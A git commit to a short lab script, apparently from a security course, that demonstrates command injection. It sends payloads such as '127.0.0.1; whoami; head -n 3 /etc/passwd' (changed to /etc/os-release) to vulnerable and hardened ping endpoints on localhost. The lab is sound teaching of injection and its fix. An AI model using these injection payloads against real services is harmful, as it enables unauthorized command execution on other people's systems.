b79f8844e273b24dd21ebfb379f8828e4287998a
inegus <email@example.com>
2026-09-23 22:01:41 +0700

    added demonstration

--- lab1/attack.sh
+++ lab1/attack.sh
@@ -3,15 +3,23 @@
 URL="http://localhost:5000"
 
 echo "=== (/api/ping) ==="
-echo "Payload: 127.0.0.1; whoami; head -n 3 /etc/passwd"
+echo "Payload: 127.0.0.1; whoami; head -n 3 /etc/os-release"
 curl -s -X POST "$URL/api/ping" \
      -H "Content-Type: application/json" \
-     -d '{"host": "127.0.0.1; whoami; head -n 3 /etc/passwd"}'
+     -d '{"host": "127.0.0.1; whoami; head -n 3 /etc/os-release"}'
 echo -e "\n"
 
-echo "=== (/api/ping_safe) ==="
-echo "Payload: 127.0.0.1; whoami; head -n 3 /etc/passwd"
+echo "=== (/api/ping_safe) invalid ==="
+echo "Payload: 127.0.0.1; whoami; head -n 3 /etc/os-release"
 curl -s -X POST "$URL/api/ping_safe" \
      -H "Content-Type: application/json" \
-     -d '{"host": "127.0.0.1; whoami; head -n 3 /etc/passwd"}'
+     -d '{"host": "127.0.0.1; whoami; head -n 3 /etc/os-release"}'
+echo -e "\n"
+
+
+echo "=== (/api/ping_safe) valid==="
+echo "Payload: 127.0.0.1"
+curl -s -X POST "$URL/api/ping_safe" \
+     -H "Content-Type: application/json" \
+     -d '{"host": "127.0.0.1"}'
 echo ""
